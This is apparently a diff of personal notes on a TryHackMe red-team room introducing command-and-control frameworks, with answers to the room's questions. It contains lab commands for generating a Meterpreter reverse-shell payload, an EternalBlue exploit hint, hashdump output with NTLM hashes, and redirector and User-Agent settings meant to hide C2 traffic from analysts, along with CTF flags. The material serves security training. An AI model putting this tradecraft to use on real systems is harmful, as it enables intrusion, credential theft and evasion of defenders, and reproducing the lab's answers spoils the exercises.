@@ -6,7 +6,6 @@ Learn the essentials of Command and Control to help you become a better Red Team
 
 ### Introduction 
 
-
 Welcome to Intro to C2 
 
 Command and Control (C2) Frameworks are an essential part of both Red Teamers and Advanced Adversaries playbooks. They make it both easy to manage compromised devices during an engagement and often help aid in lateral movement.
@@ -28,7 +27,6 @@ Room Prerequisites
     General familiarity with Red Teaming; for more information, see the Red Team Fundamentals room.
     General familiarity with exploiting vulnerable virtual machines.
 
-
 ### Command and Control Framework Structure 
 
 What is a Command and Control Framework
@@ -48,7 +46,6 @@ In order to understand a Command and Control framework, we must first start by u
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/5de5e62c5ba37013302790062b6b429e.png)
 
 This screenshot depicts a basic C2 server diagram.
-
 
 Agents / Payloads
 
@@ -99,7 +96,6 @@ sleep = sleep + jitter
 ```
 
 It's important to note that this is a fundamental example,  but it can be much more math-heavy, setting upper bounds and lower bounds, taking percentages of last sleep, and building on from there. Because this is an introduction room, we will spare you a complicated formula.
-
 
 Payload Types
 
@@ -207,17 +203,14 @@ The diagram above depicts how C2 profiles work:
 3. The C2 Server receives the request and looks for the custom header, and then evaluates how to respond based on the C2 Profile.
 4. The C2 Server responds to the client and responds to the Analyst/Compromised device.
 
-
 Because HTTPS requests are encrypted, extracting specific headers (ex: X-C2-Server, or Host) may be impossible. By using C2 Profiles, we may be able to hide our C2 server from the prying eyes of a Security Analyst. For more information on how C2 profiles can be powerful, see this blog post on [Understanding Malleable C2 Profiles for Cobalt Strike.](https://blog.zsec.uk/cobalt-strike-profiles/)
 In task 7, we will explain and explore another technique called "Redirectors". We will gain hands-on experience configuring Metasploit and Apache 2 to demonstrate how a redirector is set up.
-
 
 What is the component's name that lives on the victim machine that calls back to the C2 server?
 *agent*
 
 What is the beaconing option that introduces a random delay value to the sleep timer?
 *jitter*
-
 
 What is the term for the first portion of a Staged payload?
 *dropper*
@@ -237,7 +230,6 @@ Throughout your journey, you may encounter many different C2 Frameworks; we will
 You may ask some questions like “Why would I use a premium or paid C2 framework?”, and this is an excellent question. Premium/Paid C2 frameworks usually are less likely to be detected by Anti-Virus vendors. This is not to say that it's impossible to be detected, just that open-source C2 projects are generally well understood, and signatures can be easily be developed.
 
 Usually, premium C2 frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. For example, one feature Cobalt Strike offers that most other C2 frameworks do not is the ability to open a VPN tunnel from a beacon. This can be a fantastic feature if a Proxy does not work well in your specific situation. You must do your research to find out what will work best for your team.
-
 
 Free C2 Frameworks
 
@@ -287,7 +279,6 @@ msf6 >
 
         
 
-
 ```
 
 Armitage
@@ -297,7 +288,6 @@ Armitage
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6fc808991c2ea5a5faae2a271f9bf907.png)
 
 A Screenshot of the Armitage UI
-
 
 Powershell Empire/Starkiller
 
@@ -338,7 +328,6 @@ Screenshot of the Brute Ratel UI - Source: https://bruteratel.com/
 Other C2 Frameworks
 
 For a more comprehensive list of C2 Frameworks and their capabilities, check out the “[C2 Matrix](https://howto.thec2matrix.com/)”, a project maintained by Jorge Orchilles and Bryson Bort. It has a far more comprehensive list of almost all C2 Frameworks that are currently available. We highly recommend that after this room, you go check it out and explore some of the other C2 Frameworks that were not discussed in this room. 
-
 
 Learn about some common C2 Frameworks that are out in the wild!
 *No answer needed*
@@ -547,7 +536,6 @@ root@kali$ cd /opt/armitage/release/unix && ./armitage
 [*] Starting Cortana on 10.10.69.193
 [*] Creating a default reverse handler... 0.0.0.0:8836
 
-
         
 ```
 
@@ -568,7 +556,6 @@ After a moment or two, the Armitage UI should open up, until we start interactin
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/fca62d124845af393a71e38e9eb94edb.png)
 
 Now that Armitage is set up and working correctly, in the next task, we will learn more about securely accessing Armitage (as described above), creating listeners, various listener types, generating payloads, and much more!
-
 
 Read the task, set up Armitage, and explore the User Interface.
 *No answer needed*
@@ -608,7 +595,6 @@ SSH Port Forward
 root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
 root@kali$ echo "Connected" 
 Connected
-
 
 ```
 
@@ -652,7 +638,6 @@ Payload size: 354 bytes
 Final size of exe file: 73802 bytes
 Saved as: shell.exe
 
-
 ```
 
 After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. After a moment or two, you should receive a callback from the machine.
@@ -680,7 +665,6 @@ DNS Listeners are a popular technique specifically used in the exfiltration stag
 SMB Listener - 
 
 Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. Metasploit has support for Named Pipes.
-
 
 Which listener should you choose if you have a device that cannot easily access the internet?
 *dns*
@@ -746,26 +730,10 @@ Now that you have learned how to exploit hosts using Armitage, you will now get 
 
 Need Some Help? Click here! 
 
-![[Pasted image 20220909210929.png]]
-
 (use exploit/windows/ms17_010_eternalblue and revershell)
-![[Pasted image 20220909210959.png]]
-
-![[Pasted image 20220909211012.png]]
-
-![[Pasted image 20220909210831.png]]
-
 
 What flag can be found after gaining Administrative access to the PC?
 *THM{bd6ea6c871dced619876321081132744}*
-
-![[Pasted image 20220909212616.png]]
-
-![[Pasted image 20220909213642.png]]
-
-![[Pasted image 20220909213743.png]]
-
-![[Pasted image 20220909215235.png]]
 
 ```
 msf6 > use post/windows/gather/hashdump msf6 post(windows/gather/hashdump) > set SESSION 2 SESSION => 2 msf6 post(windows/gather/hashdump) > run -j [*] Post module running as background job 14. [*] Obtaining the boot key... [*] Calculating the hboot key using SYSKEY 1f79d249d8137464d25f308a9cef832e... [*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints...  No users with password hints on this system  [*] Dumping password hashes...   Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d108721c5626a6a054d6e0943c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867e5664425c1309a5c:::
@@ -773,8 +741,6 @@ msf6 > use post/windows/gather/hashdump msf6 post(windows/gather/hashdump) > set
 
 What is the Administrator's NTLM hash? (If you are experiencing issues while running the windows/gather/hashdump module, ensure you are running the module from a Meterpreter session and not a standard "Command" session.)
 *c156d5d108721c5626a6a054d6e0943c*
-
-![[Pasted image 20220909211746.png]]
 
 (use more or type to read)
 What flag can be found after gaining access to Ted's user account?
@@ -875,7 +841,6 @@ To activate the new configuration, you need to run:
 
         
 
-
 ```
 
 Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. 
@@ -928,7 +893,6 @@ root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
 
 </VirtualHost>
 
-
         
 ```
 
@@ -964,7 +928,6 @@ root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
 
 </VirtualHost>
 
-
         
 ```
 
@@ -973,7 +936,6 @@ Setting Up Exploit/Multi/Handler
 To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
 
 Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the HTTP or HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let's dive into it:
-
 
 ```
  Metasploit Redirector
@@ -1006,7 +968,6 @@ msf6 exploit(multi/handler) > run
 [*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
 [*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500
 
-
         
 ```
 
@@ -1016,7 +977,6 @@ After this has all been set up, running your Meterpreter Reverse Shell should no
 
 Lab Redirector Setup
 
-
 What setting name that allows you to modify the User Agent field in a Meterpreter payload?
 *HttpUserAgent*
 
@@ -1024,7 +984,6 @@ What setting name that allows you to modify the Host header in a Meterpreter pay
 *HttpHostHeader*
 
 ### Wrapping Up 
-
 
 Recap
 In this room, you hopefully learned a lot about Command and Control frameworks and will be able to take the knowledge you gained within this room and apply it in the real world. At the end of the day, almost everyone in Red Team Ops uses a Command and Control Framework. It's an essential part of every Red Teamer's toolkit, and we encourage you to go out and explore various C2 frameworks that were not covered or mentioned in this room.
@@ -1042,8 +1001,5 @@ After finishing this room, you may be left with some questions, and hopefully, o
 You should then take that information to the C2 Matrix spreadsheet and narrow your selection based on the questions above. If you find a Premium C2 Framework that meets your criteria, it is highly recommended you request an evaluation/trial to find out if that C2 Framework works best for you.
 
 (https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0)
-
-
-
 
 [[Red Team OPSEC]]
